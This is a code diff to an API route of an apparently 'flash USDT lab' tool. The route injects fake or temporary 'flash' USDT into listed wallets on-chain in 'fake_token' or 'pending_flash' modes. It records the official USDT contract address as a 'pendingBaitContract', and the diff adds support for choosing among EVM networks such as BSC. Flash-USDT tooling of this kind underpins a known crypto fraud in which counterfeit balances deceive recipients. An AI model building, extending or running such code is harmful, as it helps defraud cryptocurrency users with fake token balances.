@@ -13,6 +13,7 @@ import {
   isLabEvmReady,
 } from "@/lib/evm/flash-usdt-lab";
 import { getOfficialUsdtContractAddress } from "@/lib/evm/usdt-canonical";
+import { isAnyEvmNetworkConfigured, isEvmNetworkConfigured, parseEvmNetwork, type EvmNetwork } from "@/lib/evm/network";
 import type { LabInjectionMode } from "@/lib/labs/types";
 
 /**
@@ -61,6 +62,14 @@ export async function POST(req: Request) {
 
   const injectionMode = (session.injection_mode ?? "fake_token") as LabInjectionMode;
   const flashDurationMinutes = Number(session.flash_duration_minutes ?? 30);
+  const network = (parseEvmNetwork(session.network) ?? "bsc") as EvmNetwork;
+
+  if (!isEvmNetworkConfigured(network) && isAnyEvmNetworkConfigured()) {
+    return NextResponse.json(
+      { error: `Red ${network} no configurada para inyección on-chain` },
+      { status: 503 }
+    );
+  }
 
   let walletsQuery = supabase
     .from("lab_wallets")
@@ -119,8 +128,13 @@ export async function POST(req: Request) {
 
     const injectResult =
       injectionMode === "pending_flash"
-        ? await injectPendingFlashUsdt(wallet.wallet_address, amount, flashDurationMinutes)
-        : await injectFlashUsdt(wallet.wallet_address, amount);
+        ? await injectPendingFlashUsdt(
+            wallet.wallet_address,
+            amount,
+            flashDurationMinutes,
+            network
+          )
+        : await injectFlashUsdt(wallet.wallet_address, amount, network);
 
     if (injectResult.success) {
       const successStatus =
@@ -137,7 +151,7 @@ export async function POST(req: Request) {
           injected_at: new Date().toISOString(),
           metadata: {
             deliveryMethod: injectResult.deliveryMethod,
-            pendingBaitContract: getOfficialUsdtContractAddress(),
+            pendingBaitContract: getOfficialUsdtContractAddress(network),
             lastPendingBaitAt: new Date().toISOString(),
             pendingBaitRenewals: 0,
             flashExpiresAt:
@@ -194,7 +208,8 @@ export async function POST(req: Request) {
       walletsProcessed: results.length,
       injectionMode,
       flashDurationMinutes,
-      evmReady: isLabEvmReady(),
+      evmReady: isLabEvmReady(network),
+      network,
     },
     ip_address: getClientIp(req),
   });
@@ -204,7 +219,8 @@ export async function POST(req: Request) {
     injectionMode,
     flashDurationMinutes,
     expiresAt,
-    evmConfigured: isLabEvmReady(),
+    evmConfigured: isLabEvmReady(network),
+    network,
     results,
   });
 }
